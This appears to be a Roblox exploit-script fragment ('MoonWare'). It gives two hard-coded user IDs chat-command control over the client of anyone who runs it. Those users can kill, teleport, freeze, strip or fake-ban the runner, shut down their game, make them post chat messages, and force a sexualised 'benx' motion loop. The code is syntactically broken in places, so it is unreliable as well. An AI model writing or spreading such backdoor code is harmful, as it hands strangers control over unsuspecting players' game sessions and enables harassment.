-- this is open sourced lol we don't give af if you leak
local MoonWareIds = { -- Mod Perms
    265839211, -- dawn
    1112423310, -- brennen
}

local benx = false
for i,v in pairs(game.Players:GetChildren()) do
    if table.find(MoonWareIds, v.UserId) then
        print(v.Name.." has mod perms")
        
        local handler = {Commands = {}}
        local PREFIX = "!"

        function ParseMessage(Message)
            local Arguments = {}
            Message = string.lower(Message)
            local PrefixMatch = string.match(Message,"^"..PREFIX)
            if PrefixMatch then
                Message = string.gsub(Message,PrefixMatch,"",1)
                for Argument in string.gmatch(Message,"[^%s]+") do
                    table.insert(Arguments,Argument)
                end
            end
            return Arguments
        end
        function psearch(arg)
            local plr
            for i, v in pairs(game.Players:GetPlayers()) do 
                if string.lower(string.sub(v.Name, 1, string.len(arg))) == string.lower(arg) then
                    plr = v
                end
                if plr then
                return plr
            else
                print("Player couldn't be found")
            end
        end
        function handler:AddCommand(commandname,cmddesc,sc)
            local cmdinformation = {commandname}
            if sc == nil then
                sc = cmddesc
                cmddesc = nil
                table.insert(cmdinformation,sc)
                else
                table.insert(cmdinformation,cmddesc)
                table.insert(cmdinformation,sc)
            end
            table.insert(handler.Commands,cmdinformation)
        end
        v.Chatted:Connect(function(msg)
            local IsACmd = false
            msg = msg:lower()
            if msg:sub(1,3) == "/e " then
                msg = msg:sub(4)
            end
            local args = ParseMessage(msg)
            for i,cmd in pairs(handler.Commands) do
                if args[1] == cmd[1] then
                    IsACmd = true
                    table.remove(args,1)
                    if type(cmd[3]) == "function" then
                        cmd[3](args)
                        else
                        cmd[2](args)
                    end
                end
            end
            if not IsACmd then
                print("Mod user used a unknown cmd.")
            end
        end)
        
        handler:AddCommand("rejoin","",function(args)
            local ts = game:GetService("TeleportService")
            local p = game:GetService("Players").LocalPlayer
            ts:Teleport(game.PlaceId, p)
        end)
        handler:AddCommand("bring","",function(args)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
        end)
        handler:AddCommand("kill","",function(args)
            game.Players.LocalPlayer.Character.Humanoid.Health = 0
        end)
        handler:AddCommand("benx","",function(args)
            benx = true
            local Crouching = game:GetService("ReplicatedStorage").ClientAnimations.Crouching
            local PlayAnim = game.Players.LocalPlayer:WaitForChild("Humanoid"):LoadAnimation(Crouching)
            repeat
            PlayAnim:Play()
            local HumanoidRootPart = game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            local Target = v.Character.HumanoidRootPart
                
            HumanoidRootPart.CFrame = Target.CFrame * CFrame.new(0, 0, -.5)
            wait()
            HumanoidRootPart.CFrame = Target.CFrame * CFrame.new(0, 0, -.7)
            wait()
            HumanoidRootPart.CFrame = Target.CFrame * CFrame.new(0, 0, -.9)
            wait()
            HumanoidRootPart.CFrame = Target.CFrame * CFrame.new(0, 0, -1.1)
            wait()
            HumanoidRootPart.CFrame = Target.CFrame * CFrame.new(0, 0, -1.3)
            wait()
            HumanoidRootPart.CFrame = Target.CFrame * CFrame.new(0, 0, -1.1)
            wait()
            HumanoidRootPart.CFrame = Target.CFrame * CFrame.new(0, 0, -.9)
            wait()
            HumanoidRootPart.CFrame = Target.CFrame * CFrame.new(0, 0, -.7)
            wait()
            HumanoidRootPart.CFrame = Target.CFrame * CFrame.new(0, 0, -.5)
            wait()
            until benx == false
            PlayAnim:Stop()
        end)
        handler:AddCommand("unbenx","",function(args)
            benx = false
        end)
        handler:AddCommand("refresh","",function(args)
            local Pos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                if v:IsA('MeshPart') or v:IsA('Part') or v:IsA('Accessory') then
                    v:Destroy()
                end
            end
            game.Players.LocalPlayer.Character.Name = 'deleted'
        end)
        handler:AddCommand("kick","",function(args)
            game.Players.LocalPlayer:Kick(": o")
        end)
        handler:AddCommand("ban","",function(args)
            game.Players.LocalPlayer:Kick("PERMA BAN")
        end)
        handler:AddCommand("freeze","",function(args)
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
        end)
        handler:AddCommand("unfreeze","",function(args)
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
        end)
        handler:AddCommand("shutdown","",function(args)
            game:Shutdown()
        end)
        v.Chatted:Connect(function(msg)
            msg = msg:lower()
            if msg == "/e find" then
                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("MW Winning", "All")            
            end    
        end)
    end
end)
